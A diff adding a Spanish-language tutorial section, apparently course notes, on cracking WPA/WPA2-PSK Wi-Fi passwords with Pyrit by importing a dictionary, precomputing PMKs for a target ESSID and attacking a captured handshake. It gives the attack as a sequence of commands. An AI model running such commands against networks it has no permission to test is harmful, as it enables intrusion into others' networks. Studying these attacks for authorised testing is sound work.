@@ -1201,3 +1201,30 @@ pyrit -e [NombreDeRed] -i [diccionario].txt -r [captura].cap attack_cowpatty
 - Posibilidad de utilizar la GPU para el ataque si no se encuentra la PMK en la base de datos
 - Capacidad de combinar múltiples bases de datos
 - Opción de exportar/importar bases de datos para compartir entre equipos
+
+## 38. Cracking con Pyrit a través de ataque por base de datos
+
+Este video explica técnicas avanzadas de Pyrit para gestionar y utilizar grandes bases de datos de PMKs precomputadas, optimizando los ataques a redes WPA/WPA2-PSK.
+
+### Fundamento técnico:
+- Utiliza bases de datos SQL para almacenar y gestionar PMKs
+- Permite escalar a millones de contraseñas
+- Optimiza el uso de recursos mediante indexación y consultas eficientes
+
+### Procedimiento:
+1. Importar contraseñas del diccionario a la Base de Datos de Pyrit
+```bash
+pyrit -i [Diccionario].txt import_passwords
+```
+2. Agregar el ESSID de la red objetivo
+```
+pyrit -e [NombreDeRed] create_essid
+```
+3. Precalcular pares de claves PMK
+```
+pyrit batch
+```
+4. Realizar el ataque 
+```
+pyrit -r [Captura_Con_Handshake].cap attack_db
+```
